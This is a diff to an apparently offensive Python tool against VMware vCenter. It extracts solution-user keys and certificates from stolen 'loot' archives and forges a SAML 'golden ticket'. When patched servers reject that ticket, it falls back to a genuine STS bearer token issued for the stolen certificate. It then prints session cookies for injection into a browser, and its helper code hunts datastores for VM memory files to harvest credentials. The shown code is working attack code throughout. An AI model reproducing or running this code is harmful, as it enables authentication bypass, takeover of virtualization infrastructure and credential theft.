@@ -5,7 +5,6 @@ import argparse
 import base64
 import hashlib
 import mmap
-import os
 import re
 import shutil
 import socket
@@ -387,22 +386,28 @@ def check_signing_cert_staleness(target: str, cert1_pem: str) -> bool:
 
 # ─── Solution user credential extraction ───────────────────────────────────────
 
-_SOL_KEY_PATH  = 'etc/vmware-vpx/ssl/vcsoluser.key'
-_SOL_CERT_PATH = 'etc/vmware-vpx/ssl/vcsoluser.crt'
+# Paths inside config_files.tar.gz that carry solution user keys.
+# Ordered by preference — first match wins.
+_SOL_PATHS = [
+    ('etc/vmware-vpx/ssl/vcsoluser.key',   'etc/vmware-vpx/ssl/vcsoluser.crt'),
+]
+
+# Loose file stems tried in order alongside data.mdb or in the loot directory.
+_SOL_STEMS = ('vsphere-webclient', 'vcsoluser', 'machine')
 
 
 def _try_extract_sol_creds(arc_path: Path):
-    """Try to pull vcsoluser key+cert from a single tar.gz. Returns (key, cert) PEM or (None, None)."""
+    """Pull a solution user key+cert from a single tar.gz. Returns (key, cert) PEM or (None, None)."""
     try:
         with tarfile.open(arc_path) as tf:
-            # Normalize member names: strip leading './' so both './etc/...' and 'etc/...' match
             members = {m.name.lstrip('./'): m for m in tf.getmembers()}
-            key_m  = members.get(_SOL_KEY_PATH)
-            cert_m = members.get(_SOL_CERT_PATH)
-            if key_m and cert_m:
-                key_pem  = tf.extractfile(key_m).read().decode()
-                cert_pem = tf.extractfile(cert_m).read().decode()
-                return key_pem, cert_pem
+            for key_path, cert_path in _SOL_PATHS:
+                key_m  = members.get(key_path)
+                cert_m = members.get(cert_path)
+                if key_m and cert_m:
+                    key_pem  = tf.extractfile(key_m).read().decode()
+                    cert_pem = tf.extractfile(cert_m).read().decode()
+                    return key_pem, cert_pem
     except Exception:
         pass
     return None, None
@@ -410,9 +415,13 @@ def _try_extract_sol_creds(arc_path: Path):
 
 def resolve_solution_creds(paths: list, verbose=False):
     """
-    Search for vcsoluser.key and vcsoluser.crt in:
-      1. Loose files alongside data.mdb (backup-current/ style layout)
-      2. config_files.tar.gz or other archives in the same directories
+    Search for a solution user key+cert from loot files:
+      1. Loose .key/.crt pairs alongside data.mdb (vsphere-webclient, vcsoluser, machine)
+      2. config_files.tar.gz or other archives in the same directories (vcsoluser)
+
+    The STS will issue a SAML bearer token for any registered solution user, so any
+    cert that authenticates to the STS will work for the UI session path.
+
     Returns (key_pem, cert_pem) or (None, None).
     """
     dirs_checked = set()
@@ -421,30 +430,25 @@ def resolve_solution_creds(paths: list, verbose=False):
         if d in dirs_checked:
             continue
         dirs_checked.add(d)
-        key_f  = d / 'vcsoluser.key'
-        cert_f = d / 'vcsoluser.crt'
-        if key_f.exists() and cert_f.exists():
-            key_pem  = key_f.read_text()
-            cert_pem = cert_f.read_text()
-            return key_pem, cert_pem
+        for stem in _SOL_STEMS:
+            key_f  = d / f'{stem}.key'
+            cert_f = d / f'{stem}.crt'
+            if key_f.exists() and cert_f.exists():
+                if verbose:
+                    print(f'[v] Found solution user creds: {key_f}')
+                return key_f.read_text(), cert_f.read_text()
 
     for p in paths:
         if p.suffix not in ('.gz', '.tgz'):
             continue
         key_pem, cert_pem = _try_extract_sol_creds(p)
         if key_pem:
+            if verbose:
+                print(f'[v] Extracted solution user creds from {p.name}')
             return key_pem, cert_pem
 
     return None, None
 
-
-def _cert_subject_cn(cert_pem: str) -> str:
-    try:
-        from cryptography.x509 import load_pem_x509_certificate
-        cert = load_pem_x509_certificate(cert_pem.encode())
-        return cert.subject.rfc4514_string()
-    except Exception:
-        return '(unknown)'
 
 
 # ─── WS-Trust / STS solution user authentication ───────────────────────────────
@@ -1327,7 +1331,7 @@ def build_and_sign_saml(target: str, hostname: str, domain: str,
            .replace('$NOT_BEFORE',   before)
            .replace('$NOT_AFTER',    after))
 
-    root         = etree.fromstring(xml.encode())
+    root         = etree.fromstring(xml.encode(), parser=etree.XMLParser(remove_blank_text=True))
     assertion_id = root.find('{urn:oasis:names:tc:SAML:2.0:assertion}Assertion').get('ID')
 
     signer = XMLSigner(c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#')
@@ -1374,6 +1378,92 @@ def saml_login(target: str, signed_xml: bytes, relay_state: str = '') -> tuple:
             return name, m.group(1), s
 
     sys.exit(f'[-] No session cookie in SAML response (final URL: {r.url})')
+
+
+def saml_login_sol_user(target: str, sol_key_pem: str, sol_cert_pem: str,
+                         domain: str, verbose: bool = False) -> tuple:
+    """Authenticate to the vCenter UI using a real STS-issued SAML bearer token.
+
+    Issues a WS-Trust bearer token for the solution user, wraps the bare
+    Assertion in a minimal samlp:Response (the ACS expects a Response, not a
+    bare Assertion), and posts it via an SP-initiated relay-state flow.
+
+    Because the assertion is genuinely signed by the vCenter STS (Java XML
+    DSig), it passes the back-channel STS Validate call on patched 8.0.3.
+
+    Works with any registered solution user cert:  vcsoluser (from
+    config_files.tar.gz), vsphere-webclient, machine, etc.
+
+    Returns (cookie_name, cookie_value, requests.Session).
+    Raises RuntimeError on failure.
+    """
+    import requests as req
+    import uuid as _uuid
+    from datetime import datetime, timezone
+    req.packages.urllib3.disable_warnings()
+
+    if verbose:
+        print('[v] Issuing real STS bearer token for solution user...')
+    assertion_xml = sts_issue_bearer_token(target, sol_key_pem, sol_cert_pem,
+                                           domain, verbose=verbose)
+    if not assertion_xml:
+        raise RuntimeError('STS did not issue a bearer token — wrong cert/key or domain?')
+
+    now_s   = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.000Z')
+    m_id    = re.search(r'ID="([^"]+)"', assertion_xml)
+    resp_id = f'_resp{m_id.group(1)}' if m_id else f'_resp{_uuid.uuid4().hex}'
+    m_iss   = re.search(r'<(?:saml2?:)?Issuer[^>]*>([^<]+)</(?:saml2?:)?Issuer>', assertion_xml)
+    issuer  = m_iss.group(1) if m_iss else f'https://{target}/websso/SAML2/Metadata/{domain}'
+
+    response_xml = (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
+        f' Destination="https://{target}/ui/saml/websso/sso"'
+        f' ID="{resp_id}" IssueInstant="{now_s}" Version="2.0">'
+        f'<saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">{issuer}</saml2:Issuer>'
+        '<samlp:Status>'
+        '<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>'
+        '</samlp:Status>'
+        + assertion_xml +
+        '</samlp:Response>'
+    ).encode()
+
+    s = req.Session()
+    s.verify = False
+    r1 = s.get(f'https://{target}/ui/login', allow_redirects=False, timeout=10)
+    loc = r1.headers.get('Location', '')
+    if verbose:
+        print(f'[v] /ui/login → {r1.status_code}  Location: {loc[:100]}')
+    m_rs = re.search(r'RelayState=([^&\s]+)', loc)
+    if not m_rs:
+        raise RuntimeError('Could not extract relay state from /ui/login redirect')
+    relay_state = urllib.parse.unquote(m_rs.group(1))
+
+    r2 = s.post(
+        f'https://{target}/ui/saml/websso/sso',
+        data={'SAMLResponse': base64.encodebytes(response_xml).decode(),
+              'RelayState': relay_state},
+        allow_redirects=True, timeout=15,
+    )
+    if verbose:
+        print(f'[v] ACS POST → {r2.status_code}  final URL: {r2.url}')
+
+    for name in ('VSPHERE-UI-JSESSIONID', 'VSPHERE-CLIENT-SESSION-ID'):
+        value = s.cookies.get(name)
+        if value:
+            return name, value, s
+
+    set_cookie = ''
+    for resp in getattr(r2, 'history', [r2]):
+        set_cookie += resp.headers.get('Set-Cookie', '') + ' '
+    set_cookie += r2.headers.get('Set-Cookie', '')
+    for name in ('VSPHERE-UI-JSESSIONID', 'VSPHERE-CLIENT-SESSION-ID'):
+        m = re.search(rf'{name}=([^;]+)', set_cookie)
+        if m:
+            s.cookies.set(name, m.group(1), domain=target, path='/ui')
+            return name, m.group(1), s
+
+    raise RuntimeError(f'No session cookie after solution-user login (status={r2.status_code})')
 
 
 # ─── REST API session ───────────────────────────────────────────────────────────
@@ -1709,12 +1799,6 @@ def _extract_creds(vmem_path: Path, output_dir: Path):
 
 # ─── interactive helpers ────────────────────────────────────────────────────────
 
-def _prompt(msg: str) -> bool:
-    try:
-        ans = input(f'{msg} [Y/n] ').strip().lower()
-        return ans in ('', 'y', 'yes')
-    except (EOFError, KeyboardInterrupt):
-        return False
 
 
 def _select_vms(vms: list) -> list:
@@ -1809,9 +1893,9 @@ def _discover_existing_snapshots(vc: 'VCenterSession', vm_name: str,
             if ds_names:
                 break
     if not ds_names:
-        ds_names = ['datastore1', 'esxi-nfs-datastore', 'vsanDatastore', 'local']
+        ds_names = ['datastore1', 'vsanDatastore', 'local']
 
-    dc_names   = ['ha-datacenter', 'Lab-DC', 'Datacenter', 'datacenter']
+    dc_names   = ['ha-datacenter', 'Datacenter', 'datacenter']
     snap_re    = re.compile(r'[Ss]napshot(\d+)\.(vmem|vmsn|vmss)$', re.I)
     found_dc   = None
     found_ds   = None
@@ -1901,9 +1985,9 @@ def _download_memory_files(vc: 'VCenterSession', vm_name: str, vm_path: str,
                 break
 
     if not ds_names:
-        ds_names = ['datastore1', 'esxi-nfs-datastore', 'vsanDatastore', 'local']
+        ds_names = ['datastore1', 'vsanDatastore', 'local']
 
-    dc_names = ['ha-datacenter', 'Lab-DC', 'Datacenter', 'datacenter']
+    dc_names = ['ha-datacenter', 'Datacenter', 'datacenter']
 
     print(f'\n[*] Searching datastores for {vm_name} memory files...')
     downloaded = []
@@ -2037,92 +2121,85 @@ def main():
                                                      key_pem, cert1_pem, cert2_pem, authn_id)
 
         if choice == '1':
-            import http.server, threading, socket as _socket, re as _re
             import requests as _req
             _req.packages.urllib3.disable_warnings()
 
-            # Authenticate via Python (confirmed working)
+            # ── Authentication waterfall ──────────────────────────────────────
+            # Path 1: forged SAML golden ticket (compact XML, SP-initiated).
+            # Works on unpatched and patched vCenter 8.0.x.
+            print('[*] Trying SAML golden ticket (IdP key from data.mdb)...')
             cname, cval, ui_session = saml_login(target, signed, relay_state)
-            print(f'\n[+] Authenticated session cookies:')
-            print(f'    {cname}={cval}')
-            for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
-                v = ui_session.cookies.get(extra)
-                if v:
-                    print(f'    {extra}={v}')
-
-            # Build a proxy session pre-loaded with the vCenter cookies.
-            # The browser talks to this proxy; the proxy forwards every request
-            # to vCenter with the authenticated session injected.  No cookie
-            # injection into the browser is needed — the browser just sees
-            # the proxy serving vCenter content.
+            _h5_ok = False
             try:
-                _sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
-                _sock.connect((target, 443))
-                local_ip = _sock.getsockname()[0]
-                _sock.close()
+                _h5r = ui_session.get(f'https://{target}/ui/config/h5-config',
+                                      params={'debug': 'false'},
+                                      verify=False, timeout=8)
+                _h5_ok = _h5r.json().get('hasUserSession', False)
             except Exception:
-                local_ip = '0.0.0.0'
+                pass
 
-            vc_base  = f'https://{target}'
-            _skip    = {'transfer-encoding', 'connection', 'keep-alive',
-                        'content-encoding', 'host', 'cookie'}
-            _pxsess  = _req.Session()
-            _pxsess.verify = False
-            for _n, _v in ui_session.cookies.items():
-                _pxsess.cookies.set(_n, _v, domain=target, path='/ui')
-
-            def _strip_secure(val):
-                return _re.sub(r';\s*Secure', '', val, flags=_re.I)
-
-            class _Proxy(http.server.BaseHTTPRequestHandler):
-                def do_GET(self):  self._fwd('GET')
-                def do_POST(self): self._fwd('POST')
-                def do_PUT(self):  self._fwd('PUT')
-                def do_DELETE(self): self._fwd('DELETE')
-                def do_PATCH(self):  self._fwd('PATCH')
-
-                def _fwd(self, method):
-                    px_base = f'http://{local_ip}:{srv.server_address[1]}'
-                    url  = f'{vc_base}{self.path}'
-                    n    = int(self.headers.get('Content-Length', 0))
-                    body = self.rfile.read(n) if n else None
-                    hdrs = {k: v for k, v in self.headers.items()
-                            if k.lower() not in _skip}
+            if not _h5_ok:
+                # Path 2: real STS bearer token for a solution user.
+                # Passes back-channel validation on patched 8.0.3 because the
+                # assertion carries a real Java XML DSig signature.  Works with
+                # vcsoluser.key/crt from config_files.tar.gz, vsphere-webclient,
+                # or any other registered solution user cert in the loot.
+                if sol_key and sol_cert:
+                    print('[*] Golden ticket rejected (patched 8.0.3) — trying solution-user STS token...')
                     try:
-                        r = _pxsess.request(method, url, headers=hdrs,
-                                            data=body, allow_redirects=False,
-                                            verify=False, timeout=30)
-                        self.send_response(r.status_code)
-                        for k, v in r.headers.items():
-                            kl = k.lower()
-                            if kl in _skip: continue
-                            if kl == 'set-cookie':
-                                v = _strip_secure(v)
-                            elif kl == 'location' and v.startswith(vc_base):
-                                v = px_base + v[len(vc_base):]
-                            self.send_header(k, v)
-                        self.end_headers()
-                        self.wfile.write(r.content)
-                    except Exception as exc:
-                        self.send_response(502)
-                        self.end_headers()
-                        self.wfile.write(str(exc).encode())
+                        cname, cval, ui_session = saml_login_sol_user(
+                            target, sol_key, sol_cert, domain,
+                            verbose=args.verbose)
+                        _h5_ok = True
+                    except Exception as _e:
+                        print(f'[-] Solution-user STS token failed: {_e}')
+                else:
+                    print('[!] hasUserSession=False and no solution user creds found.')
+                    print('    Provide config_files.tar.gz (contains vcsoluser.key/crt) to enable')
+                    print('    the STS-token path, which works on patched vCenter 8.0.3.')
 
-                def log_message(self, fmt, *args):
-                    pass
+            if not _h5_ok:
+                sys.exit('[-] Authentication failed: hasUserSession=False on all attempted paths.')
 
-            srv = http.server.HTTPServer(('0.0.0.0', 0), _Proxy)
-            port = srv.server_address[1]
-            threading.Thread(target=srv.serve_forever, daemon=True).start()
-
-            print(f'\n[+] Proxy ready — open this URL in any browser on the subnet:')
-            print(f'\n    http://{local_ip}:{port}/ui/')
-            print(f'\n    All traffic is forwarded to vCenter using the authenticated session above.')
-            input('\n    Press Enter when done to stop the proxy...\n')
-            srv.shutdown()
+            # ── Browser delivery: serve a self-submitting SAML form ──────────
+            # The browser POSTs the assertion directly to vCenter's ACS so
+            # vCenter sets the session cookies itself (proper HttpOnly/Secure
+            # flags, no cross-origin cookie injection required).
+            try:
+                _h5_user = ui_session.get(f'https://{target}/ui/config/h5-config',
+                                          params={'debug': 'false'}, verify=False,
+                                          timeout=8).json().get('userName', 'unknown')
+            except Exception:
+                _h5_user = 'unknown'
+            print(f'\n{"="*60}')
+            print(f'[+] Verified: {_h5_user}')
+            print(f'\n[!] First: open DevTools on https://{target}, go to')
+            print(f'    Application > Cookies > https://{target} and delete ALL')
+            print(f'    existing cookies for that host.')
+            print(f'\n[*] Then paste these into the browser Console:\n')
+            for c in ui_session.cookies:
+                print(f"    document.cookie='{c.name}={c.value}; path=/ui'")
+            print(f'\n[*] Then navigate to: https://{target}/ui/')
+            print(f'{"="*60}\n')
             return
 
-        cname, cval, ui_session = saml_login(target, signed, relay_state)
+        # choice == '2' — same authentication waterfall as choice '1'
+        _cname2, _cval2, ui_session = saml_login(target, signed, relay_state)
+        try:
+            _h5r2 = ui_session.get(f'https://{target}/ui/config/h5-config',
+                                   params={'debug': 'false'}, verify=False, timeout=8)
+            _h5ok2 = _h5r2.json().get('hasUserSession', False)
+        except Exception:
+            _h5ok2 = False
+        if not _h5ok2 and sol_key and sol_cert:
+            print('[*] Golden ticket rejected — using solution-user STS token for VIM session...')
+            try:
+                _cname2, _cval2, ui_session = saml_login_sol_user(
+                    target, sol_key, sol_cert, domain, verbose=args.verbose)
+            except Exception as _e2:
+                print(f'[-] Solution-user STS token failed: {_e2}')
+        cname, cval = _cname2, _cval2
+
         print(f'\n[+] https://{target}/ui/')
         print(f'    {cname}={cval}')
         for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
